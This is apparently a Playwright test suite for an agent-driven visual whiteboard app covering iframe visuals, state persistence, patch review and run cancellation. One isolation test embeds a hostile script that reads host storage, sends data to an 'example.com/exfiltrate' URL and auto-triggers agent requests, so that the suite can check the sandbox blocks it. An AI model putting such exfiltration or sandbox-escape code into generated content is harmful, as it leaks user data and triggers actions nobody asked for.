import { test, expect, type Page } from '@playwright/test';

const html = `<style>body{padding:28px;font-family:system-ui}h2{font-size:25px;color:#233b59}label{display:block;margin:24px 0}input{width:100%}output{display:block;font-size:36px;color:#387b64}button{margin-top:20px;padding:10px 16px}</style>
<h2>探索你的方案</h2><p>改变条件，看看结果如何变化。</p><label for="budget">投入强度</label><input id="budget" type="range" min="1" max="10" step="1"><output id="impact" aria-label="预期变化"></output><button id="ask">基于这个结果继续讨论</button>
<script>const input=document.getElementById('budget'),output=document.getElementById('impact');
function render(){output.textContent='当前投入 '+input.value;}
input.value=agentboard.getState().budget||4;render();
input.addEventListener('input',()=>{agentboard.setState({budget:Number(input.value)});render()});
agentboard.onStateChange(state=>{input.value=state.budget||4;render()});
document.getElementById('ask').onclick=()=>agentboard.ask('根据我调整后的投入，继续完善方案',{source:'slider'});</script>`;
const visualNode = { id: 'visual', type: 'card', title: '模型实验室', body: '测试用的自由生成视觉', x: 110, y: 100, width: 900, height: 160,
  visual: { html, state: { budget: 4 }, height: 320 } };
const board = { version: '0.1', board: { id: 'board', title: '共创空间', viewport: { x: 0, y: 0, zoom: 1 } }, nodes: [visualNode], edges: [], groups: [], metadata: {} };
const patch = (ops: unknown[], summary = '已完善视觉', questions: string[] = []) => ({ type: 'dsl_patch', summary, ops, questions });
const visualFrame = (page: Page) => page.locator('[data-node-id="visual"]').frameLocator('iframe');

async function start(page: Page, nodes: unknown[] = [visualNode]) {
  await page.addInitScript(({ board, nodes }) => {
    if (window.top !== window) return;
    if (!localStorage.getItem('agentboard.sessions')) localStorage.setItem('agentboard.sessions', JSON.stringify({
      activeId: 's1', sessions: [{ id: 's1', title: '共创空间', board: { ...board, nodes }, createdAt: 1, updatedAt: 1 }],
    }));
    localStorage.setItem('agentboard.config', JSON.stringify({ provider: 'local-cli', cliId: 'codex' }));
  }, { board, nodes });
  await page.route('**/api/clis', route => route.fulfill({ json: [{ id: 'codex', name: 'Codex CLI', available: true }] }));
  await page.goto('/');
}

async function agentResponse(page: Page, value: unknown, requests: any[] = []) {
  await page.route('**/api/agent/run', async route => {
    requests.push(route.request().postDataJSON());
    await route.fulfill({ contentType: 'application/x-ndjson', body: JSON.stringify({ type: 'result', text: JSON.stringify(value) }) + '\n' });
  });
}

async function submit(page: Page, text: string) {
  await page.locator('.prompt-bar textarea').fill(text);
  await page.locator('.prompt-bar textarea').press('Enter');
}

test('first screen explains open visual collaboration', async ({ page }) => {
  await start(page, []);
  await expect(page.getByRole('heading', { name: '和 Agent 一起，把想法变成可操作的内容' })).toBeVisible();
  await expect(page.getByRole('button', { name: /看懂一个系统/ })).toBeVisible();
});

test('the verified example works before an agent is configured', async ({ page }) => {
  await page.goto('/');
  await page.getByRole('button', { name: '先体验一个交互示例 →' }).click();
  const frame = page.locator('.visual-node').frameLocator('iframe');
  await expect(frame.locator('#years')).toHaveValue('5');
  await frame.locator('#years').focus();
  await frame.locator('#years').press('End');
  await expect(frame.locator('#result')).toContainText('4,321.94');
  await page.screenshot({ path: 'docs/verification/agentboard-v0.3-example.png', fullPage: true });
});

test('page load handlers and native control state survive without a custom SDK integration', async ({ page }) => {
  const source = `<label><input type="radio" name="mode" value="a">方案A</label><label><input type="radio" name="mode" value="b">方案B</label>
  <select id="features" multiple><option value="one">一</option><option value="two">二</option></select><input id="secret" type="password"><output id="ready"></output>
  <script>document.addEventListener('DOMContentLoaded',()=>{document.getElementById('ready').textContent='ready'})</script>`;
  await start(page, [{ ...visualNode, visual: { html: source, state: {} } }]);
  const frame = visualFrame(page);
  await expect(frame.locator('#ready')).toHaveText('ready');
  await frame.getByLabel('方案B', { exact: true }).check();
  await frame.locator('#features').selectOption(['one', 'two']);
  await frame.locator('#secret').fill('do-not-persist');
  await expect.poll(() => page.evaluate(() => JSON.parse(localStorage.getItem('agentboard.sessions')!).sessions[0].board.nodes[0].visual.state._inputs.features)).toEqual(['one', 'two']);
  expect(await page.evaluate(() => localStorage.getItem('agentboard.sessions'))).not.toContain('do-not-persist');
  await page.reload();
  await expect(visualFrame(page).getByLabel('方案B', { exact: true })).toBeChecked();
  await expect(visualFrame(page).locator('#features')).toHaveValues(['one', 'two']);
});

test('switching boards cancels the old run without writing into the new board', async ({ page }) => {
  let release: () => void = () => {};
  const gate = new Promise<void>(resolve => { release = resolve; });
  await page.route('**/api/agent/run', async route => {
    await gate;
    await route.fulfill({ contentType: 'application/x-ndjson', body: JSON.stringify({ type: 'result', text: JSON.stringify(patch([{ op: 'add_node', node: { ...visualNode, id: 'late', title: '旧任务结果' } }])) }) + '\n' }).catch(() => {});
  });
  await page.route('**/api/agent/run/*', route => route.fulfill({ json: { status: 'cancelled' } }));
  await start(page);
  await submit(page, '继续完善');
  await expect(page.locator('.agent-run-overlay')).toBeVisible();
  await page.locator('.topbar').getByRole('button', { name: /新建/ }).click();
  release();
  await expect(page.locator('.empty-board-welcome')).toBeVisible();
  await expect(page.locator('.board-node')).toHaveCount(0);
  await expect(page.locator('.agent-run-overlay')).toHaveCount(0);
  const data = await page.evaluate(() => JSON.parse(localStorage.getItem('agentboard.sessions')!));
  expect(data.sessions.find((s: any) => s.id === data.activeId).board.nodes).toEqual([]);
  expect(data.sessions.find((s: any) => s.id === 's1').board.nodes).toHaveLength(1);
});

test('generated scripts run and real control changes survive refresh', async ({ page }) => {
  await start(page);
  const frame = visualFrame(page);
  await expect(frame.locator('#impact')).toHaveText('当前投入 4');
  await frame.locator('#budget').focus();
  await frame.locator('#budget').press('End');
  await expect(frame.locator('#impact')).toHaveText('当前投入 10');
  await expect.poll(() => page.evaluate(() => JSON.parse(localStorage.getItem('agentboard.sessions')!).sessions[0].board.nodes[0].visual.state.budget)).toBe(10);
  await page.reload();
  await expect(visualFrame(page).locator('#impact')).toHaveText('当前投入 10');
});

test('visual follow-up drafts a request with current state, without auto-running an agent', async ({ page }) => {
  const requests: any[] = [];
  await agentResponse(page, patch([], '已理解你的调整'), requests);
  await start(page);
  await visualFrame(page).locator('#budget').focus();
  await visualFrame(page).locator('#budget').press('End');
  await visualFrame(page).getByRole('button', { name: '基于这个结果继续讨论' }).click();
  await expect(page.locator('.prompt-bar textarea')).toHaveValue(/根据我调整后的投入/);
  expect(requests).toHaveLength(0);
  await page.locator('.prompt-bar textarea').press('Enter');
  await expect.poll(() => requests.length).toBe(1);
  expect(requests[0].userMessage).toContain('"budget": 10');
  expect(requests[0].userMessage).toContain('用户引用的视觉细节');
});

test('picking a detail creates an anchored reference', async ({ page }) => {
  await start(page);
  await expect(visualFrame(page).locator('#impact')).toBeVisible();
  await page.getByRole('button', { name: '引用细节', exact: true }).click();
  await visualFrame(page).locator('#impact').click();
  await expect(page.locator('.reference-detail')).toContainText('预期变化');
  await page.getByRole('button', { name: '取消细节引用' }).click();
  await expect(page.locator('.reference-detail')).toHaveCount(0);
});

test('expanding and returning keeps the interaction state', async ({ page }) => {
  await start(page);
  await visualFrame(page).locator('#budget').focus();
  await visualFrame(page).locator('#budget').press('End');
  await expect.poll(() => page.evaluate(() => JSON.parse(localStorage.getItem('agentboard.sessions')!).sessions[0].board.nodes[0].visual.state.budget)).toBe(10);
  await page.getByRole('button', { name: '展开', exact: true }).click();
  const expanded = page.locator('.visual-expanded');
  await expect(expanded.frameLocator('iframe').locator('#impact')).toHaveText('当前投入 10');
  await expanded.getByRole('button', { name: '收起', exact: true }).click();
  await expect(visualFrame(page).locator('#impact')).toHaveText('当前投入 10');
});

test('code revisions can be reviewed, applied and undone while preserving state', async ({ page }) => {
  await start(page);
  await visualFrame(page).locator('#budget').focus();
  await visualFrame(page).locator('#budget').press('End');
  await expect.poll(() => page.evaluate(() => JSON.parse(localStorage.getItem('agentboard.sessions')!).sessions[0].board.nodes[0].visual.state.budget)).toBe(10);
  await agentResponse(page, patch([{ op: 'update_node', nodeId: 'visual', changes: { visual: { html: html.replace('探索你的方案', '改进后的交互方案'), height: 320 } } }]));
  await submit(page, '保留我的参数，改进一下视觉');
  await expect(page.getByRole('button', { name: '预览前后变化' })).toBeVisible();
  await page.getByRole('button', { name: '预览前后变化' }).click();
  await expect(page.locator('.patch-review-dialog')).toBeVisible();
  await expect(page.locator('.review-comparison > div').nth(1).frameLocator('iframe').getByRole('heading', { name: '改进后的交互方案' })).toBeVisible();
  await page.locator('.patch-review-dialog').getByRole('button', { name: '确认应用', exact: true }).click();
  await expect(visualFrame(page).getByRole('heading', { name: '改进后的交互方案' })).toBeVisible();
  await expect(visualFrame(page).locator('#impact')).toHaveText('当前投入 10');
  await page.locator('.patch-result-toast').getByRole('button', { name: '撤销', exact: true }).click();
  await expect(visualFrame(page).getByRole('heading', { name: '探索你的方案' })).toBeVisible();
});

test('a pending proposal cannot overwrite newer user interaction', async ({ page }) => {
  await start(page);
  await agentResponse(page, patch([{ op: 'update_node', nodeId: 'visual', changes: { visual: { html: html.replace('探索你的方案', '旧提案') } } }]));
  await submit(page, '修改视觉');
  await expect(page.getByRole('button', { name: '预览前后变化' })).toBeVisible();
  await visualFrame(page).locator('#budget').focus();
  await visualFrame(page).locator('#budget').press('End');
  await expect.poll(() => page.evaluate(() => JSON.parse(localStorage.getItem('agentboard.sessions')!).sessions[0].board.nodes[0].visual.state.budget)).toBe(10);
  await page.locator('.patch-proposal-toast').getByRole('button', { name: '确认应用', exact: true }).click();
  await expect(visualFrame(page).getByRole('heading', { name: '探索你的方案' })).toBeVisible();
  await expect(visualFrame(page).locator('#impact')).toHaveText('当前投入 10');
});

test('new turns include previous constraints and surface follow-up suggestions', async ({ page }) => {
  const requests: any[] = [];
  await agentResponse(page, patch([], '已记住两周完成', ['继续拆解第一周']), requests);
  await start(page);
  await submit(page, '只有两周时间');
  await expect(page.getByRole('button', { name: '继续拆解第一周', exact: true })).toBeVisible();
  await page.getByRole('button', { name: '继续拆解第一周', exact: true }).click();
  await expect.poll(() => requests.length).toBe(2);
  expect(requests[1].userMessage).toContain('只有两周时间');
  expect(requests[1].userMessage).toContain('已记住两周完成');
});

test('a real adapter response may contain more than three operations', async ({ page }) => {
  const ops = Array.from({ length: 5 }, (_, i) => ({ op: 'add_node', node: { ...visualNode, id: `node_${i}`, visual: undefined, x: 100 + i * 320, width: 240, title: `部分 ${i + 1}` } }));
  await agentResponse(page, patch(ops));
  await start(page, []);
  await submit(page, '创建五个部分');
  await expect(page.locator('.board-node')).toHaveCount(5);
});

test('generated code cannot read host storage, submit agent requests or access arbitrary network', async ({ page }) => {
  const requests: any[] = [];
  await agentResponse(page, patch([]), requests);
  const malicious = `<p id="result">testing</p><script>
  let blocked=false;try{parent.localStorage.getItem('agentboard.config')}catch(e){blocked=true}
  document.getElementById('result').textContent=blocked?'host isolated':'leaked';
  fetch('https://example.com/exfiltrate').catch(()=>{});
  agentboard.ask('untrusted auto request');
  parent.postMessage({type:'state',state:{budget:999}},'*');
  </script>`;
  let exfiltrated = false;
  await page.route('https://example.com/**', async route => { exfiltrated = true; await route.abort(); });
  await start(page, [{ ...visualNode, visual: { html: malicious, state: {} } }]);
  await expect(visualFrame(page).locator('#result')).toHaveText('host isolated');
  await expect(page.locator('.prompt-bar textarea')).toHaveValue('untrusted auto request');
  expect(requests).toHaveLength(0);
  expect(exfiltrated).toBe(false);
  expect(await page.locator('iframe').getAttribute('sandbox')).toBe('allow-scripts');
});

test('visuals become interactive after their scripts finish loading', async ({ page }) => {
  let release = () => {};
  const gate = new Promise<void>(resolve => { release = resolve; });
  await page.route('https://cdn.jsdelivr.net/agentboard-ready-test.js', async route => {
    await gate;
    await route.fulfill({ contentType: 'text/javascript', body: 'window.libraryReady = true;' }).catch(() => {});
  });
  const html = '<button id="ready-ask">继续探索</button><script src="https://cdn.jsdelivr.net/agentboard-ready-test.js"></script><script>document.getElementById("ready-ask").onclick=()=>agentboard.ask("脚本已准备好，可以继续讨论")</script>';
  try {
    await start(page, [{ ...visualNode, visual: { html, height: 200 } }]);
    await expect(page.locator('.visual-loading')).toBeVisible();
    await expect(page.locator('.visual-frame iframe')).toBeHidden();
    release();
    await expect(page.locator('.visual-loading')).toHaveCount(0);
    await visualFrame(page).getByRole('button', { name: '继续探索' }).click();
    await expect(page.locator('.prompt-bar textarea')).toHaveValue('脚本已准备好，可以继续讨论');
    await expect(page.locator('.visual-error')).toHaveCount(0);
  } finally { release(); }
});
